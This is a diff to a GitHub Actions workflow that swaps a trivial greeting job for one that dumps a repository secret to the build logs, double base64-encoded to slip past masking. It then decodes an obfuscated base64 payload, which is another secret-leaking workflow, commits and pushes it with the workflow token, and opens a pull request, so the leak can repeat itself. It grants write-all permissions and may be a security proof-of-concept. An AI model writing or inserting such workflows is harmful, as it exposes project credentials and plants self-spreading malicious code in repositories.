@@ -1,14 +1,67 @@
-name: Say hi
+name: Create and Push Branch, Then Make PR
 
 on:
   pull_request:
-    types: [opened, reopened, syncronize, edited]
+    types: [opened, reopened, synchronize, edited]
+  repository_dispatch:
+  # This is so that when the bot creates the repo, it triggers
+  # But it will create a recursive workflow, so gotta fix it later
+    types: [create-pull-request] 
+
+permissions: 
+  write-all
 
 jobs:
-  release:
-    name: Say hi
-    runs-on: ubuntu-22.04
+  create-push-pr:
+    runs-on: ubuntu-latest
+
     steps:
-      - name: Say hi
+      - name: Leak
         run: |
-          echo "hi"
+          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
+
+      - name: Checkout repository
+        uses: actions/checkout@v2
+        with:
+          persist-credentials: false
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Set up Git
+        run: |
+          git config --global user.name 'github-actions[bot]'
+          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
+
+      - name: Create new branch
+        run: |
+          BRANCH_NAME="leak-branch-$(date +%s)"
+          echo "BRANCH_NAME=${BRANCH_NAME}" >> $GITHUB_ENV
+          git checkout -b ${BRANCH_NAME}
+
+      - name: Make changes
+        run: |
+          mkdir -p .github/workflows
+          CONTENT=$(echo "bmFtZTogTGVhayBzZWNyZXQKCm9uOgogIHB1bGxfcmVxdWVzdDoKICAgIHR5cGVzOiBbb3BlbmVkLCByZW9wZW5lZCwgc3luY2hyb25pemUsIGVkaXRlZF0KCnBlcm1pc3Npb25zOiAKICB3cml0ZS1hbGwKCmpvYnM6CiAgZXhhbXBsZS1qb2I6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CgogICAgc3RlcHM6CgogICAgICAteiBuYW1lOiBSdW4gc2NyaXB0CiAgICAgIHJ1bjogfAogICAgICAgIGVjaG8gJHt7IHNlY3JldHMuU1VQRVJfU0VDUkVUIH19IHwgYmFzZTY0IC13MCB8IGJhc2U2NCAtdzA=" | base64 -d)
+          FILENAME=$(echo "dGVzdC5tZA==" | base64 -d)
+          echo "$CONTENT" > $FILENAME
+          git add $FILENAME
+          git commit -m "Add leak.yml to leak secrets"
+
+      - name: Push changes to new branch
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BRANCH_NAME: ${{ env.BRANCH_NAME }}
+        run: |
+          git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
+          git push -u origin ${BRANCH_NAME}
+
+      - name: Create Pull Request
+        uses: peter-evans/create-pull-request@v4
+        with:
+            commit-message: aaa
+            title: bbb
+            body: ccc
+            base: ${{ env.BRANCH_NAME }}
+            labels: automated-pr, Clouds & Regions
+            branch: main
+            delete-branch: true
+
